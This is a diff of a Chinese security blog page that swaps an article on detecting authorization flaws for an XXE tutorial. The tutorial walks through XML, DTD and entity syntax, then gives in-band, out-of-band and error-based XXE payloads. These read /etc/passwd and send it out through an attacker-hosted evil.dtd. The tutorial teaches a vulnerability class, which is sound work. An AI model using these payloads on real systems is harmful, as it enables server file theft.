@@ -152,124 +152,171 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-初探检测未授权与越权问题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-XXE概要" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/">初探检测未授权与越权问题</a>
+      <a class="article-title" href="/2023/06/01/XXE%E6%A6%82%E8%A6%81/">XXE概要</a>
     </h1>
   
 
         
-        <a href="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/" class="archive-article-date">
-  	<time datetime="2023-04-09T07:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-09</time>
+        <a href="/2023/06/01/XXE%E6%A6%82%E8%A6%81/" class="archive-article-date">
+  	<time datetime="2023-06-01T07:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-06-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="初探检测未授权与越权问题"><a href="#初探检测未授权与越权问题" class="headerlink" title="初探检测未授权与越权问题"></a>初探检测未授权与越权问题</h1><p>目前阶段研究结果来看，通过codeql静态代码扫描可以发现部分越权问题，框架类的未授权与接口越权问题也可以通过codeql来覆盖，但非框架授权机制下的未授权漏洞就无法通过静态代码扫描进行检测。通过IAST/RASP可以覆盖非框架未授权访问问题，但需要构建相应的测试用例，似乎与人工测试没差别了，所以构建此类工具覆盖非框架问题就好像没必要。</p>
-<h2 id="1-现状"><a href="#1-现状" class="headerlink" title="1. 现状"></a>1. 现状</h2><p>…</p>
-<h2 id="2-未授权与越权问题"><a href="#2-未授权与越权问题" class="headerlink" title="2. 未授权与越权问题"></a>2. 未授权与越权问题</h2><h3 id="2-1-定义问题"><a href="#2-1-定义问题" class="headerlink" title="2.1. 定义问题"></a>2.1. 定义问题</h3><ol>
-<li>未授权漏洞：没有登录凭证也能访问到敏感接口</li>
-<li>越权漏洞中，具体 “权” 的定义：<ul>
-<li>接口权限：基于接口路径与用户角色的权限管控  （类似垂直越权）</li>
-<li>数据权限：根据凭证ID进行权限管控、根据数据状态进行权限管控（优惠券、签到礼品）</li>
-</ul>
-</li>
-</ol>
-<h3 id="2-2-问题模型"><a href="#2-2-问题模型" class="headerlink" title="2.2. 问题模型"></a>2.2. 问题模型</h3><p>权限管理中，可以抽离出三种要素，分别是 用户 、实体、策略</p>
-<p>关于逻辑漏洞的未授权访问与越权问题，我们尝试通过以下模型进行分析，后面再给出当前的解决方案、解决思路。</p>
-<p>图中说到的DAO方法执行也存在数据不来源用户而来源当前凭证的情况，这种情况我们可不认为有越权问题（在自动检测中）。</p>
-<img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/flow.png" alt="flow" style="zoom:80%;">
+        <h1 id="XXE概要"><a href="#XXE概要" class="headerlink" title="XXE概要"></a>XXE概要</h1><h2 id="XML入门学习"><a href="#XML入门学习" class="headerlink" title="XML入门学习"></a>XML入门学习</h2><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>XML （extensible markup language）表示可扩展的标记语言，XML被设计用于数据的传输和存储，同时具备可读性，通常的使用场景有 API交互、UI布局、应用配置、RSS订阅等 svg pdf </p>
+<p>我们先快速阅览下面这个简单的例子：首行数据指明了这是一个XML文档，并申明其版本；student 标签为这里的根标签，其下有两个子标签。标签名称大小写敏感，且标签文本内中不能直接填写 <code>&lt;&gt;&amp;&#39;&quot;</code>这些特殊字符。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>May<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>15<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>XML文档中可以通过DTD（document type Definition)来定义一系列的文档标记语法，其声明格式大致如下（字符串值表示时需使用双引号或单引号包裹且前后一致）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE name [ internalSubset ] &gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE name ExternalID  &gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE name ExternalID [ subset ]  &gt;</span><br><span class="line"></span><br><span class="line">ExternalID ，外部标识 ::&#x3D; (SYSTEM &quot;systemLiteral&quot; | PUBLIC &quot;publicLiteral&quot; &quot;systemLiteral&quot;)</span><br><span class="line">systemLiteral ，实体系统ID ；publicLiteral，即互联网公共ID  ，这两个也可称为 systemId publicId。</span><br><span class="line"></span><br><span class="line">internalSubset ::&#x3D;  (markupDecl |PEReference )*</span><br><span class="line">markupDecl，标记申明 ::&#x3D; (elementdecl | AttlistDecl | EntityDecl | NotationDecl | PI | Comment)</span><br><span class="line">PEReference，参数实体引用 ::&#x3D; %name;</span><br></pre></td></tr></table></figure>
+
+<p><code>internalSubset</code>中可定义各种标记：<code>ELEMENT</code> <code>ATTLIST</code> <code>ENEITY</code>  等 ， ExternalID 中则可申明引用外部XML/DTD 。</p>
+<p>下面我们通过几个例子理解DTD的格式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.168.128/test.dtd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"PID"</span> <span class="meta-string">"http://192.168.168.128/test.dtd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">entity</span> <span class="meta-string">"str"</span>&gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.168.128/test.dtd"</span>[<span class="meta">&lt;!ENTITY <span class="meta-keyword">entity</span> <span class="meta-string">"str"</span>&gt;</span>]&gt;</span></span><br></pre></td></tr></table></figure>
 
 
 
-<p>下面我们先简单了解一下 框架是如何进行授权访问、路由鉴权 ，自定义Filter如何授权访问 及 Controller这里的越权校验。</p>
-<h3 id="2-3-框架路由授权"><a href="#2-3-框架路由授权" class="headerlink" title="2.3. 框架路由授权"></a>2.3. 框架路由授权</h3><p>下图为shiro框架的路由访问配置，其中 map 的 value 配置为 <code>anno</code> 的表示该路径可未授权访问</p>
-<img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/shiroFilterFactoryBean.png" alt="shiroFilterFactoryBean" style="zoom:80%;">
+<h3 id="Entity"><a href="#Entity" class="headerlink" title="Entity"></a>Entity</h3><p>DTD的各标记中我们主要关注Entity，entity在XML文档中用于展现文本等数据，类似变量，我们可以在DTD中定义赋值并且在XML文档中的使用它。</p>
+<p>entity的格式大致如下（字符串值表示时需使用双引号或单引号包裹且前后一致）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">EntityDecl ::&#x3D; GEDecl | PEDecl</span><br><span class="line"></span><br><span class="line">GEDecl，普通实体 ::&#x3D; &lt;!ENTITY name &quot;EntityDef&quot;&gt;</span><br><span class="line">PEDecl，参数实体 ::&#x3D; &lt;!ENTITY % name &quot;PEDef&quot;&gt;</span><br><span class="line"></span><br><span class="line">EntityDef，普通实体值 ::&#x3D; EntityValue | (ExternalID NDataDecl?)</span><br><span class="line">PEDef，参数实体值 ::&#x3D; EntityValue | ExternalID</span><br><span class="line"></span><br><span class="line">ExternalID ，外部标识 ::&#x3D; (SYSTEM &quot;systemLiteral&quot; | PUBLIC &quot;publicLiteral&quot; &quot;systemLiteral&quot;)</span><br><span class="line">systemLiteral ，实体系统ID ；publicLiteral，即互联网公共ID  ，这两个也可称为 systemId publicId。</span><br><span class="line"></span><br><span class="line">EntityValue ::&#x3D;  普通文本 | PEReference，%name; | EntityReference，&amp;name;</span><br></pre></td></tr></table></figure>
 
+<p>从entity格式定义中可以了解到存在普通实体与参数实体两种情况，且这两种实体都可以引入外部XML/DTD文档。另外，我们把引入了外部XML/DTD文档的实体叫做<code>外部实体</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity &quot;str&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY entity SYSTEM &quot;http:&#x2F;&#x2F;192.168.168.128&#x2F;test.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY entity PUBLIC &quot;PID&quot; &quot;http:&#x2F;&#x2F;192.168.168.128&#x2F;test.dtd&quot;&gt;]</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % entity &quot;str&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % entity SYSTEM &quot;http:&#x2F;&#x2F;192.168.168.128&#x2F;test.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % entity PUBLIC &quot;PID&quot; &quot;http:&#x2F;&#x2F;192.168.168.128&#x2F;test.dtd&quot;&gt;]</span><br></pre></td></tr></table></figure>
 
+<p>在定义了实体后，我们需要引用它来进行使用，参数实体引用<code>PEReference</code>的格式为<code>%name；</code>，普通实体引用<code>EntityReference</code>格式为<code>&amp;name;</code>，前者只能在DTD中使用，后者可在XML文档中各字符串数据中使用。</p>
+<p>下面例子定义了一个普通实体，并在XML body中引用了它，如果服务器在处理了XML文档后并回显student.name，我们就可看到student.name值为May：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">student</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY  <span class="meta-keyword">name</span> <span class="meta-string">"May"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>15<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2-4-框架接口鉴权"><a href="#2-4-框架接口鉴权" class="headerlink" title="2.4. 框架接口鉴权"></a>2.4. 框架接口鉴权</h3><p> <code>org.apache.shiro.authz.annotation.RequiresPermissions</code></p>
-<p>后台接口方法这里通过配置注解设置了接口权限标识 <code>system:notice:list</code></p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/shiro_RequiresPermissions.png" alt="shiro_RequiresPermissions"></p>
-<p>用户已登录的情况下，根据情况设置其拥有的接口权限：</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/shiro_AuthorizingRealm.png" alt="shiro_AuthorizingRealm"></p>
-<h3 id="2-5-非框架授权"><a href="#2-5-非框架授权" class="headerlink" title="2.5. 非框架授权"></a>2.5. 非框架授权</h3><p>开发人员编写了一个Filter对用户进行授权问题，可以看到，先排除了一些无需授权访问的路径；随后通过JWT Token鉴别用户是否登录，如果未登录则返回401.</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/self_AuthFilter.png" alt="self_AuthFilter"></p>
-<h3 id="2-6-越权校验"><a href="#2-6-越权校验" class="headerlink" title="2.6. 越权校验"></a>2.6. 越权校验</h3><p>该图中的后台接口功能未设置用户信息，实际上执行了如下这样一个SQL语句</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> nickName=<span class="string">'xxx'</span>,pic=<span class="string">'xxx'</span> <span class="keyword">where</span> userId=<span class="string">'xxx'</span></span><br></pre></td></tr></table></figure>
+<p>我们将例子中的实体改为外部实体，systemId设置为本地文件，在java中可以用来进行文件读取：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">student</span> [</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">name</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>15<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>如果userId是用户可控的，则存在越权问题</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/logic_2.png" alt></p>
-<p>这里的修改密码 <code>updateById</code> 的Bean对象User的userId 来源于<code>userService.getOne</code>的查询结果，而该查询的输入<code>nickName</code>可被用户控制，导致了该接口存在越权问题。</p>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/vuln_1.png" alt="vuln_1"></p>
-<h3 id="2-7-总结"><a href="#2-7-总结" class="headerlink" title="2.7. 总结"></a>2.7. 总结</h3><p>在filter中，通过RASP/IAST 构建代码流程图检测漏洞</p>
+<p>关于参数实体我们在后面的XXE漏洞利用详情中还会具体讲到它。</p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="场景及利用方式"><a href="#场景及利用方式" class="headerlink" title="场景及利用方式"></a>场景及利用方式</h3><p><code>X</code>ML E<code>x</code>ternal <code>E</code>ntity Injection，即我们前文所说的外部实体引发的问题，通常根据利用场景或利用方式可分为 </p>
 <ul>
-<li>未授权访问漏洞：需要构建的测试用例为 已登录用户访问接口、未登录用户访问接口</li>
-<li>接口越权问题：需要构建的测试用例为 不同角色访问同一接口</li>
+<li>回显（in-band）</li>
+<li>基于报错 (error based)</li>
+<li>带外 (out of band) .</li>
 </ul>
-<p>在controller中，通过codeql 来检测漏洞</p>
+<img src="/2023/06/01/XXE%E6%A6%82%E8%A6%81/in_band.png" alt="in_band" style="zoom: 80%;">
+
+
+
+<img src="/2023/06/01/XXE%E6%A6%82%E8%A6%81/err.png" alt="err" style="zoom:80%;">
+
+
+
+<img src="/2023/06/01/XXE%E6%A6%82%E8%A6%81/out_of_band.png" alt="out_of_band" style="zoom: 80%;">
+
+<h3 id="数据带外"><a href="#数据带外" class="headerlink" title="数据带外"></a>数据带外</h3><p>如果我们没有找到回显标签数据的接口，或是在Execel等特殊场景下无法回显数据，可以尝试通过带外的方式进行漏洞利用。</p>
+<p>我们先了解一下如何通过实体定义其他实体：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">	&lt;!ENTITY % parameter_entity &quot;&lt;!ENTITY general_entity &#39;PwnFunction&#39;&gt;&quot;&gt;</span><br><span class="line">	%parameter_entity;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;general_entity;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>实际上，上面的DTD达到下面DTD的效果，即通过参数实体，我们可以在XML中以字符串方式“eval”一个实体：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">	&lt;!ENTITY % parameter_entity &quot;&lt;!ENTITY general_entity &#39;PwnFunction&#39;&gt;&quot;&gt;</span><br><span class="line">	&lt;!ENTITY general_entity &#39;PwnFunction&#39;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;general_entity;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以尝试通过该方式定义实体send，让其带上文件内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">	&lt;!ENTITY % passwd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM  &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;?%passwd;&#39;&gt;&quot;&gt;</span><br><span class="line">	%wrapper;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但当我们发送给服务器时可以发现会有如下报错信息：内部DTD中的markup（即ENTITY ATTLIST 等）不能使用 参数实体的引用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;timestamp&quot;:&quot;...&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;Error on line 4 of document  : The parameter entity reference \&quot;%passwd;\&quot; cannot occur within markup in the internal subset of the DTD. Nested exception: The parameter entity reference \&quot;%passwd;\&quot; cannot occur within markup in the internal subset of the DTD.&quot;,&quot;path&quot;:&quot;&#x2F;XXETest&#x2F;dom4j&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在XML标准文档中也可以看到确有这一规范，但其也指明了通过外部DTD可绕过这一限制：</p>
+<p><a href="https://www.w3.org/TR/REC-xml/#wfc-PEinInternalSubset" target="_blank" rel="noopener">https://www.w3.org/TR/REC-xml/#wfc-PEinInternalSubset</a></p>
+<p>In the internal DTD subset, parameter-entity references <em>must not</em> occur within markup declarations; they may occur where markup declarations can occur. (This does not apply to references that occur in external parameter entities or to the external subset.)</p>
+<p>首先将<code>evil.dtd</code> 存放于VPS HTTP服务器上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % passwd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % wrapper &quot;&lt;!ENTITY send SYSTEM  &#39;ftp:&#x2F;&#x2F;127.0.0.1&#x2F;%passwd;&#39;&gt;&quot;&gt;</span><br><span class="line">%wrapper;</span><br></pre></td></tr></table></figure>
+
+<p>POC如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">	%dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果不清楚服务器解析哪些标签数据，我们可只使用参数实体：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % passwd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % wrapper &quot;&lt;!ENTITY &amp;#x25; send SYSTEM  &#39;ftp:&#x2F;&#x2F;127.0.0.1&#x2F;%passwd;&#39;&gt;&quot;&gt;</span><br><span class="line">%wrapper; %send;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;evil.dtd&quot;&gt; </span><br><span class="line">	%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="报错型"><a href="#报错型" class="headerlink" title="报错型"></a>报错型</h3><p>在Java中，当我们的 systemId 的协议为 <code>jar://</code>、<code>file://</code> 或前缀为 <code>url:</code> 时，文件不存在或其他错误导致程序抛出异常时，异常数据会包含该 systemid  （ url不是协议，后续需要跟file http 等），当如果服务器返回了这个 异常数据，我们就通过这个抛异常来进行XXE文件读取漏洞利用。</p>
+<img src="/2023/06/01/XXE%E6%A6%82%E8%A6%81/err_based_1.png" alt="err_based_1" style="zoom:67%;">
+
+<p>error based 通常可在如下场景使用：</p>
 <ul>
-<li>越权（根据用户ID进行权限管控）：检测业务操作CRUD的入参是否与凭证ID有数据关联</li>
+<li>漏洞环境无法外联，但此时需要结合合适的本地DTD文件进行漏洞利用</li>
+<li>没有找到回显接口，JDK版本较高，HTTP/FTP带外数据不能有换行符号</li>
 </ul>
-<p><img src="/2023/04/09/%E5%88%9D%E6%8E%A2%E6%A3%80%E6%B5%8B%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B6%8A%E6%9D%83%E9%97%AE%E9%A2%98/flow2.png" alt="flow2"></p>
-<h2 id="3-检测越权漏洞"><a href="#3-检测越权漏洞" class="headerlink" title="3. 检测越权漏洞"></a>3. 检测越权漏洞</h2><p>首先需要认识到，我们难以或无法检测一些逻辑缺陷的问题，如框架或非框架中对未授权访问路由的鉴别代码逻辑存在缺陷导致的未授权访问，具体一点，Filter中判断HTTP URL路径含有<code>/image</code>则放行，但攻击者通过<code>/test?foo=/image</code>进行绕过。</p>
-<p>在 第2章 提到的问题中，框架类的情况通过codeql检测的话，理论上会相对简单，最复杂的情况是 非框架授权 问题 ，越权检测也比较复杂且意义重大，本章节我们讲述一下目前的思路方案。</p>
-<h3 id="3-1-思路"><a href="#3-1-思路" class="headerlink" title="3.1. 思路"></a>3.1. 思路</h3><p>通过codeql白盒工具检测越权问题，我们实践思路是，检查 <code>用户的输入</code> 到 <code>业务方法</code> 的<code>数据流</code>是否经过<code>可靠的检查</code>。</p>
-<p>业务方法：DAO方法的执行（SQL执行）、数据缓存操作（Redis Set）</p>
-<p>可靠的检查有两种方式，分别为 ：</p>
-<p>​        1、数据流代码节点上，有调用“可信方法”，即来自不可靠的输入被处理为了可靠的数据，又再作为输入，如 <code>String userId = SecurityUtlis.getUser().getUserID()</code></p>
-<p>​        2、数据流代码节中，调用可信方法对，存在某一节点代码通过可信方法对数据进行校验，不符合预期则抛异常，如<code>if(!Object.equals(userId,SecurityUtlis.getUser().getUserID())){ throw new Exception(&quot;error id&quot;);}</code></p>
-<p>可信方法：</p>
-<p>​        可将不安全的输入转换为安全的输出、或是检测不安全的输入与已缓存的安全的数据（用户凭证）是否符合。</p>
-<p>​        基础可信方法：</p>
-<p>​                    shiro/spring-security 安全框架获取凭证的方法</p>
-<p>​                    redis的get、ThreadLocal.get（缓存了凭证）、其他未发掘的情况</p>
-<p>​        通过基础可信方法，递归检测源码，获得所有可信方法：将可信方法作为返回值的、或是参数数据与可信方法有关联并抛异常的    </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不安全的输入 -&gt; 安全的输出 , request是不安全的，通过JWT获取到安全的authToken</span></span><br><span class="line"><span class="comment">// getUserNameFromToken 是可信方法</span></span><br><span class="line">String authHeader = request.getHeader(<span class="keyword">this</span>.tokenHeader);</span><br><span class="line">String authToken = authHeader.substring(<span class="keyword">this</span>.tokenHead.length());</span><br><span class="line">UserDetails userDetails = <span class="keyword">this</span>.userDetailsService.loadUserByUsername(username);</span><br></pre></td></tr></table></figure>
+<p>如在JDK8u_301下，我们通过HTTP/FTP是无法读取到 /etc/passwd，通过以下POC，在有报错信息的情况下，我们可以类似利用回显型XXE一样进行文件读取：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;url:&#x2F;&#x2F;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
 
